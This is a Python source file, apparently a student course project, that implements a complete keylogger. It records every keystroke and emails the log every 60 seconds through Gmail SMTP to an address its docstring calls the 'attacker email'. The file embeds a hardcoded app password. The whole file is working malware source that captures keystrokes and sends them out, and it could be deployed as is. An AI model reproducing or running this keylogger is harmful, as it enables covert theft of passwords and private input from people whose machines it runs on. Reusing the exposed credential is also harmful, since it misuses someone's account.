# Author: Shaily Gupta
# Purpose: BCIT COMP8045
# Student ID: A00952989

import keyboard 
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 # in seconds
EMAIL_ADDRESS = "shailygup.bcit8045@gmail.com"
EMAIL_PASSWORD = "repolqohydhlcxkg" # Temp app password

class Keylogger:
    def __init__(self, interval, reportMethod="email"):
        self.interval = interval
        self.reportMethod = reportMethod
        self.log = ""
        self.startDt = datetime.now()
        self.endDt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured

        :param event: keyboard event invoked
        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores, easier to read in the email
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        """
        This method constructs the filename to be identified by start & end datetimes
        """
        startDtStr = str(self.startDt)[:-7].replace(" ", "-").replace(":", "")
        endDtStr = str(self.endDt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{startDtStr}_{endDtStr}"

    def report_to_file(self):
        """
        This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable
        """
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    
    def prepare_mail(self, message):
        """
        Utility function to construct a MIMEMultipart from a text. 
        It creates both html and text parts for ease of use.

        :param message: Message on the email to be sent
        :return: The message as a string
        """
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        textPart = MIMEText(message, "plain")
        htmlPart = MIMEText(html, "html")
        msg.attach(textPart)
        msg.attach(htmlPart)

        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        """
        This method sends an email with the keylogger file.

        :param email: attacker email
        :param password: email password (can be temp password)
        :param message: Email body
        :param verbose: Software parameter regarding logging. By default this is enabled.
        """
        # manages a connection to an SMTP server
        # https://support.google.com/a/answer/176600?hl=en
        server = smtplib.SMTP_SSL(host="smtp.gmail.com")
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
    
    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.endDt = datetime.now()
            self.update_filename()
            if self.reportMethod == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.reportMethod == "file":
                self.report_to_file()
            # print(f"[{self.filename}] - {self.log}") # Used for testing
            self.startDt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        """
        This method will start the keylogger.
        """
        self.startDt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()
    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, reportMethod="email")
    keylogger.start()
